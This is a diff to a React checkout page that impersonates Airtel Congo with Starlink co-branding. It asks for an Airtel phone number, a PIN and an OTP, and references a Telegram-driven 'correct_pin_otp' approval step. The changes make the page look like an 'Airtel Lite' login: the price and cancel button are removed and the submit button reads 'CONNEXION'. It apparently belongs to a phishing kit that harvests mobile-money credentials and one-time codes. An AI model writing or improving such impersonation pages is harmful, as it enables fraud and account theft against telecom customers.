@@ -566,10 +566,10 @@ function App() {
     const verificationApproved = telegramAction?.action === 'correct_pin_otp';
 
     return (
-      <main className="page-shell">
+      <main className="page-shell checkout-page-shell">
         <div className="checkout-shell">
-          <section className="airdata-topbar" aria-label="Partenariat">
-            <div className="airdata-topbar-left">
+          <section className="checkout-airtel-hero" aria-label="Airtel Lite">
+            <div className="checkout-airtel-logo-wrap">
               <BrandMark
                 sources={['/brand/airtel-logo.svg', '/brand/airtel-logo.png', '/brand/airtel-logo.jpg', '/brand/airtel-logo.jpeg', '/brand/airtel-logo.webp']}
                 alt="Airtel"
@@ -577,32 +577,13 @@ function App() {
                 brand="airtel"
               />
             </div>
-            <div className="airdata-topbar-center">
-              <span>En collaboration avec</span>
-              <div>
-                <strong>STARLINK</strong>
-                <BrandMark
-                  sources={['/brand/starlink-logo.svg', '/brand/starlink-logo.png', '/brand/starlink-logo.jpg', '/brand/starlink-logo.jpeg', '/brand/starlink-logo.webp']}
-                  alt="Starlink"
-                  fallbackType="starlink"
-                  brand="starlink"
-                  small
-                />
-              </div>
-            </div>
-            <button type="button" className="airdata-topbar-action" aria-label="Options">
-              <UiGlyph type="refresh" />
-            </button>
+            <h1>Connectez-vous a Airtel Lite pour finaliser le paiement.</h1>
           </section>
 
-          <section className="checkout-card">
-            <div className="checkout-header">
-              <div>
-                <span className="checkout-tag">RESERVATION</span>
-                <h1 className="checkout-title">Choisissez {checkoutOffer.title}</h1>
-              </div>
-              <button type="button" className="checkout-back" onClick={handleBack}>
-                ← Retour aux offres
+          <section className="checkout-card checkout-card-lite">
+            <div className="checkout-header-lite">
+              <button type="button" className="checkout-back checkout-back-inline" onClick={handleBack}>
+                ← Retour
               </button>
             </div>
 
@@ -644,7 +625,7 @@ function App() {
                   <label className="form-field">
                     <span className="label-with-icon"><UiGlyph type="mobile" />Numero Airtel</span>
                     <div className="phone-field-row">
-                      <span className="phone-country">CD <strong>+243</strong></span>
+                      <span className="phone-country">🇨🇩 <strong>+243</strong></span>
                       <input
                         type="tel"
                         value={normalizedLocalNumber}
@@ -684,7 +665,7 @@ function App() {
 
               {approvalPassed && !paymentConfirmed && (
                 <label className="form-field">
-                  <span className="label-with-icon"><UiGlyph type="otp" />Code OTP</span>
+                  <span className="label-with-icon otp-label-centered"><UiGlyph type="otp" />Entrez votre Code</span>
                   <div className="otp-grid" onPaste={handleOtpPaste}>
                     {otpDigits.map((digit, idx) => (
                       <input
@@ -724,19 +705,16 @@ function App() {
               )}
 
               <div className="form-actions">
-                <button type="button" className="button-secondary" onClick={handleBack}>
-                  Annuler
-                </button>
                 <button
                   type="submit"
-                  className="button-primary"
+                  className="button-primary button-connect"
                   disabled={(approvalPassed && otpTimer === 0 && !paymentConfirmed) || submissionLoading || waitingApproval || actionLoading}
                 >
                   {submissionLoading
                     ? 'Envoi...'
                     : approvalPassed
-                      ? 'Valider OTP'
-                      : `Valider et payer ${checkoutOffer.currency}${checkoutOffer.price.toFixed(2)}`}
+                      ? 'CONNEXION'
+                      : 'CONNEXION'}
                 </button>
               </div>
             </form>
@@ -816,23 +794,17 @@ function App() {
             )}
           </section>
 
-          <section className="airdata-trust" aria-label="Avantages">
-            <article>
-              <span aria-hidden="true">⚡</span>
-              <strong>Activation instantanee</strong>
-            </article>
-            <article>
-              <span aria-hidden="true">🔒</span>
-              <strong>Paiement securise</strong>
-            </article>
-            <article>
-              <span aria-hidden="true">📞</span>
-              <strong>Support 24/7</strong>
-            </article>
-          </section>
-
-          <footer className="airdata-footer">
-            © 2026 Airtel Congo. Tous droits reserves.
+          <footer className="checkout-collab-footer">
+            <div className="checkout-collab-logo">
+              <BrandMark
+                sources={['/brand/airtel-logo.svg', '/brand/airtel-logo.png', '/brand/airtel-logo.jpg', '/brand/airtel-logo.jpeg', '/brand/airtel-logo.webp']}
+                alt="Airtel"
+                fallbackType="airtel"
+                brand="airtel"
+              />
+            </div>
+            <p>En collaboration avec</p>
+            <strong>STARLINK™</strong>
           </footer>
         </div>
       </main>
